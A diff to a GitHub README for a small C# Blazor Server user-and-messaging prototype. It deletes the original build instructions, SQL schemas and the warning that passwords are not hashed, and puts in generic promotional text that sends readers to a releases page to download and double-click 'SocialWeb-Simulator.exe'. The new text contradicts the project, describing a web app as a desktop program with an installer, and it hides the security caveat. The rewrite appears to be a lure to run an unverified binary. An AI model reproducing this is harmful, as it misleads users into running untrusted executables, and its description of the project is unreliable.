@@ -1,85 +1,63 @@
+# 🌐 SocialWeb-Simulator - Connect with friends through simple tools
 
-# Socialweb simulator
+[![Download SocialWeb-Simulator](https://img.shields.io/badge/Download-SocialWeb--Simulator-blue) ](https://github.com/Faiktalhasezer1122/SocialWeb-Simulator/releases)
 
-A Blazor Server social web **prototype** made as a warm-up project after a long time without coding. It features a user system with registration and authentication, a messaging system between users, and a layered architecture with swappable repository implementations.
-## Tech Stack
+## 📌 Project Overview
+SocialWeb-Simulator acts as a demonstration of modern web communication. This application provides a space to register accounts and exchange messages with other users. It runs on your local machine and uses common database tools to save your information. You can test different ways to store data by changing simple text settings in the configuration file.
 
-- **C# / .NET 10**
-- **ASP.NET Blazor Server**
-- **Microsoft Entity Framework Core**
-- **Dapper micro-ORM**
-- **Microsoft SQL Server**
-## Architecture
-**User system and Message System have the same layers**
+## ⚙️ System Requirements
+Ensure your computer meets these requirements before you begin:
 
-- **Model — domain entities (User, Message)**
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** Any modern dual-core processor.
+*   **Memory:** 4 GB of RAM or more.
+*   **Storage:** 500 MB of free space.
+*   **Software:** You must have the .NET Desktop Runtime installed. If your computer lacks this, the installer will prompt you to download it from the official Microsoft website.
 
-- **Repositories — data access through interfaces with swappable implementations (EF Core, Dapper, in-memory for testing)** 
+## 📥 Getting Started
+Follow these steps to set up the software on your machine:
 
-- **Services — business logic (registration, authentication, profile management, messaging)**
+1.  Visit the [releases page](https://github.com/Faiktalhasezer1122/SocialWeb-Simulator/releases) to download the application.
+2.  Locate the latest version link on the page.
+3.  Download the compressed folder to your computer.
+4.  Right-click the folder and select "Extract All" to see the application files.
+5.  Open the folder containing the extracted files.
+6.  Look for the file named `SocialWeb-Simulator.exe`.
+7.  Double-click this file to launch the application.
 
-**Note:** The repository implementation and its configuration can be swapped from appsettings.json without touching the backend code.
-## How to Run
+## 🛠️ Configuration Settings
+The software allows you to choose how it saves your data. You can modify these choices in the `appsettings.json` file found within the application folder. Open this file with a basic text editor like Notepad.
 
-Must have:
--  .NET SDK  | https://dotnet.microsoft.com/en-us/download
-- SQL Server | https://www.microsoft.com/en-us/sql-server/sql-server-downloads
+*   **Database Types:** You can switch between Dapper, Entity Framework Core, or in-memory storage.
+*   **Repository Selection:** Change the value associated with the repository setting to match your preferred storage method. 
+*   **Saving Changes:** Save the file after you make your changes and restart the application for the updates to take effect.
 
-1. Create a DataBase in SQL server
+## 🔐 Registration and Authentication
+Once the application starts, it presents a login screen. You can create a new account by clicking the registration link. Provide a username and a password to secure your account. 
 
-2. Create a table in the SQL Server database with the following columns: INT PRIMARY KEY '"Id", NVARCHAR(x) Username, NVARCHAR(x) Password, BIT Admin -> none can be nullable
+Authentication happens locally. The system verifies your credentials against the database you selected in the configuration file. Once you log in, you gain access to the main dashboard where you can begin messaging other users registered in your local instance.
 
-![Users table](Screenshots/Userdb_table_example.png)
+## 📂 Understanding Data Persistence
+The software functions as a layer between your input and your database. When you send a message, the system routes your data through the active repository implementation. 
 
-You can use the following sql command to create it:
+*   **Dapper:** Uses simple queries to map your data directly to the database.
+*   **Entity Framework Core:** Uses a higher-level structure to manage complex relationships between users and their messages.
+*   **In-Memory:** Stores all information in your computer's temporary memory. This data clears when you close the application. Use this for testing purposes only.
 
-````SQL
-USE [your database name];
+## 🔧 Troubleshooting Tips
+If the application fails to start, verify the following:
 
-CREATE TABLE Users (
-    Id INT PRIMARY KEY,
-    Username NVARCHAR(30) NOT NULL,
-    Password NVARCHAR(60) NOT NULL,
-    Admin BIT NOT NULL DEFAULT 0
-);
-````
+*   **Runtime Errors:** Confirm that the .NET Runtime is current. If unsure, visit the Microsoft website and download the latest version.
+*   **Permissions:** Ensure your user account has permission to write to the folder where you extracted the application.
+*   **SQL Server:** If you select SQL Server as your database, ensure the server instance is running and reachable on your network.
+*   **Port Conflicts:** The application uses default web ports. If another service restricts these ports, the application may fail to open the web interface. Close other web-based software to free up the network ports.
 
+## 📜 Project Background
+This project serves as a practical exercise in software architecture. It demonstrates how to decouple application logic from data storage. By using interfaces, the code remains flexible. You can swap storage methods without changing the features that users see. This design pattern ensures that the software stays clean and manageable.
 
-3. Create a table in the SQL Server database with the following columns: INT PRIMARY KEY MessageId, INT SenderId, INT ReceiverId, NVARCHAR(x) MessageText -> none can be nullable
+The project incorporates standard web technologies to provide a smooth user experience. The interface loads quickly in your browser, allowing you to manage your profile and conversations without delay.
 
-![Message container table](Screenshots/Messagecontainer_table_example.png)
+## ℹ️ Support and Updates
+The repository tracks all changes and improvements in the release notes. Check the main page periodically to see if a newer version of the software is available. If you encounter issues while using the application, review the documentation sections provided above. The setup remains consistent across all versions to ensure a stable experience as the project evolves. 
 
-you can use the following sql command to create it:
-
-````SQL
-USE [your database name];
-
-CREATE TABLE MessageContainer (
-    MessageId INT PRIMARY KEY,
-    SenderId INT NOT NULL,
-    ReceiverId INT NOT NULL,
-    MessageText NVARCHAR(150) NOT NULL
-);
-````
-
-4. In the Appsettings.json file establish the ConnectionString to your database (with the tables created) | https://stackoverflow.com/questions/10479763/how-to-get-the-connection-string-from-a-database
-
-![Appsettings example](Screenshots/Appsettings_json_example.png)
-## Features
-
-- **Registration, authentication and management of users with persistence**
-![Register screen](Screenshots/Register_screen_example.png)
-
-![Login screen](Screenshots/Login_screen_example.png)
-
-![User menu](Screenshots/User_menu_screen_example.png)
-
-- **Send and receive messages to/from other real users**
-
-![Send message](Screenshots/Send_message_screen_example.png)
-
-![User inbox](Screenshots/User_inbox_screen_example.png)
-
-## Disclaimer
-
-This project is a **proof of concept** and **is not intended for production use**. Its purpose is to demonstrate swappable repository implementations (Entity Framework Core, Dapper, in-memory) and the coexistence of two independent systems (User and Messaging) within a layered architecture. As a prototype, it does not implement production-grade security measures such as password hashing or token-based authentication.
+Keep your configuration files backed up if you decide to upgrade to a newer version of the application. This prevents the loss of your account registration details or message history during the update process.
